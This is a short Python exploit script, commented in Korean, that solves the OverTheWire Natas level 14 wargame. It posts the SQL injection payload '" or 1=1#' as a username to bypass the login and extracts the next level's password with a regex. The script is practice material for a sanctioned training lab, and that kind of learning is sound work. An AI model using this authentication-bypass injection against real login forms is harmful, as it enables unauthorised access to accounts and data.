import requests
import re

url = "http://natas14.natas.labs.overthewire.org/"
#전 단계에서 얻은 natas14에 해당하는 비밀번호 값을 아래 변수에 대입
natas14_cred = ""

# 페이로드 및 요청 
s = requests.Session()
s.auth = ("natas14", natas14_cred)
payload = '" or 1=1#'

# sqli 익스플로잇 함수 
def expliot(payload):
  # 여기서 비밀번호는 포멧에 맞게 아무 문자열이나 보내도 상관없음(SQLI로 인한 조건절이 무력화되며 어차피 비밀번호 확인 안함) 
 data = {
   "username": payload,
   "password":"a"
 }

 # 익스플로잇 요청을 보냄
 response = s.post(url, data=data, timeout=10)

# Aceess denied인 경우 페이로드가 맞지 익스플로잇 실패함.
 if "Access denied" in response.text:
  return response.text

# re를 통해 비밀번호에 해당하는 문자열만 검색해서 출력(만약 오류페이지나 먼가 실패했다면 아래와 같이 html 전체를 출력하도록 함.)
 else:
   pass_text = re.search(r"The password for natas15 is (\w{32})", response.text) 
   if not pass_text:
     print("[-]비밀번호에 해당하는 정규식이 없으니 아래 html 페이지 전체를 확인하시오")
     print(response.text)
     return None

# 여기서 비밀번호에 해당하는 문자열 결과값 리턴
   return pass_text.group(1)   
 

# 함수에 맞게 동작하여 결과를 화면에 출력 
pw = expliot(payload)
if pw:
  print(f"[+]화면에서 찾은 비밀번호 있는 문장: {pw}")
else:
  print(f"[-]공격 실패") 
